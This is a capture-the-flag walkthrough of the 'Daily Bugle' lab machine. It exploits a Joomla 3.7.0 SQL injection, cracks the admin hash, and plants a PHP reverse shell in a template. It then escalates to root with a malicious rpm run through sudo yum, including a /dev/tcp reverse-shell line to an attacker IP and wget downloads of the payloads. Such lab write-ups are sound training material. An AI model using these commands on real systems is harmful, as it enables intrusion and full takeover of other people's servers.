<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>daily bugle</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>daily bugle</h1><br/><p><strong>Daily Bugle</strong></p><p></p><p>nmap shows 22,80,3306 open</p><p></p><p>22 - SSH</p><p>80 - Web server</p><p>3306 - MariaDB</p><p></p><p>We browse throught the news webserver. We find the <strong>/administrator</strong> directory through <strong>gobuster</strong>.</p><p></p><p></p><p></p><p>However, we do not have any credentials.</p><p></p><p>We check wappalyzer to confirm joomla running on the webserver.</p><p>To get the version use the following Link/Command.</p><p>https://www.itoctopus.com/how-to-quickly-know-the-version-of-any-joomla-website</p><p></p><p>For our case:</p><p><em><strong>http://10.10.42.252/administrator/manifests/files/joomla.xml</strong></em></p><p></p><p></p><p>We get the version as 3.7.0</p><p></p><p><em><strong>searchsploit 3.7.0</strong></em></p><p></p><p><img src="images/11-1.png" alt="images/11-1.png" /></p><p></p><p>We get the file by: <em><strong>searchsploit -m php/webapps/42033.txt</strong></em></p><p></p><p>Upon reading the file. It says to use sqlmap to exploit the vulnerability. However, sqlmap didn&#39;t find any intresting stuff.</p><p>Upon searching google for “Joomla 3.7.0 Python exploit”</p><p></p><p>We find the following code:</p><p><em><strong>https://github.com/XiphosResearch/exploits.git</strong></em></p><p></p><p>In the git link, go to <em><strong>Joomblah</strong></em> directory and use the <em><strong>joomblah.py</strong></em> file</p><p></p><p><img src="images/11-2.png" alt="images/11-2.png" /></p><p></p><p>Now, we need to crack the hash using john.</p><p></p><p><em><strong>echo &#39;$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm&#39; &gt; hash_joomla</strong></em></p><p><em><strong>john hash_joomla --wordlist=/usr/share/wordlists/rockyou.txt</strong></em></p><p></p><p><img src="images/11-3.png" alt="images/11-3.png" /></p><p></p><p>Now, we have a username and password.</p><p>Username	:	jonah</p><p>Password		:	spiderman123</p><p></p><p>We use this login credentials at <em><strong>http://10.10.42.252/administrator</strong></em> page to login into joomla control panel as super user.	</p><p></p><p>To get a shell from here on there are multiple options. (***Check research***)</p><p>We will use the templates section.</p><p></p><p>Go to <em><strong>Extensions -→ Templates -→ Templates</strong></em></p><p></p><p><img src="images/11-4.png" alt="images/11-4.png" /></p><p></p><p>Then click on <em><strong>Beez3 Details and Files</strong></em></p><p>Now, open the <em><strong>index.php</strong></em> and replace a <em><strong>php-reverse-shell code</strong></em> in that place.</p><p></p><p>Run a <strong>listner</strong> in attacker machine.</p><p>Then to exploit the malicious php file click on <strong>“Template Preview”</strong></p><p></p><p>Now we will have gained a shell in our attacker machine.</p><p></p><p><strong>Privelege Escalation</strong></p><p>Next we check for ways to elevate our privelege.</p><p>sudo -l - Nothhing</p><p>/etc/crontab - Nothing</p><p>suid files	- Nothing</p><p></p><p>We then browse the web server folder and find a file called “<strong>configuration.php</strong>”</p><p></p><p><em><strong>/var/www/html/configuration.php</strong></em></p><p></p><p><img src="images/11-5.png" alt="images/11-5.png" /></p><p></p><p></p><p></p><p>We find a password: </p><p>Upon enumeration we that the password is user password for <em><strong>jjameson</strong></em>.</p><p></p><p>Username	:	jjameson</p><p>Password		:	nv5uz9r3ZEDzVjNu</p><p></p><p></p><p>we can now ssh to the machine as <em><strong>jjameson</strong></em> and get the <em><strong>user</strong></em> flag.</p><p></p><p>Then we do <em><strong>sudo -l</strong></em></p><p><img src="images/11-6.png" alt="images/11-6.png" /></p><p></p><p>We find yum is running in sudo.</p><p>Thus we use <strong>GTFObins</strong> to use this for privelege escalation.</p><p></p><p><strong>Note: </strong>We will create a malicious rpm file which will execute code upon installation.</p><p></p><p><strong>Tool used: </strong>fpm</p><p>(gem install fpm)</p><p></p><p><em><strong>Commands in Attacker Machine:</strong></em></p><p></p><p>TF=$(mktemp -d)</p><p>echo &#39;id&#39; &gt; TF/x.sh</p><p>fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF</p><p></p><p><img src="images/11-7.png" alt="images/11-7.png" /></p><p></p><p><strong>Note:</strong> This will run the ‘<strong>id</strong>’ command upon installation.</p><p></p><p>We can tweak this to run a reverse shell.</p><p></p><p>TF=$(mktemp -d)</p><p>echo &#39;/bin/sh -i &gt;&amp; /dev/tcp/10.11.72.31/8888 0&gt;&amp;1&#39; &gt; $TF/y.sh</p><p>fpm -n y -s dir -t rpm -a all --before-install $TF/y.sh $TF</p><p></p><p><img src="images/11-8.png" alt="images/11-8.png" /></p><p></p><p>Host these files in a python web server.</p><p>And start a netcat listener.</p><p></p><p><em><strong>Commands in Target Machine(ssh session of jjameson):</strong></em></p><p></p><p><em><strong>wget http://10.11.72.31/x-1.0-1.noarch.rpm</strong></em></p><p><em><strong>wget http://10.11.72.31/y-1.0-1.noarch.rpm</strong></em></p><p></p><p>Then we run the following to install the malicious rpm and run our commands.</p><p></p><p><em><strong>sudo yum localinstall -y x-1.0-1.noarch.rpm</strong></em></p><p>This will run the ‘id’ command upon installation.</p><p></p><p><em><strong>sudo yum localinstall -y y-1.0-1.noarch.rpm</strong></em></p><p>This will run a reverse shell as root/</p><p></p><p></p><p></p><p><strong>Note:</strong> To remove the installation.( Say to run again)</p><p></p><p><em><strong>sudo yum remove x-1.0-1</strong></em></p><p>or</p><p><em><strong>sudo yum remove y-1.0-1</strong></em></p><p></p><p>Now in the root shell get the root flag</p><p></p><p>Thanks!!</p></div>
</body>
</html>
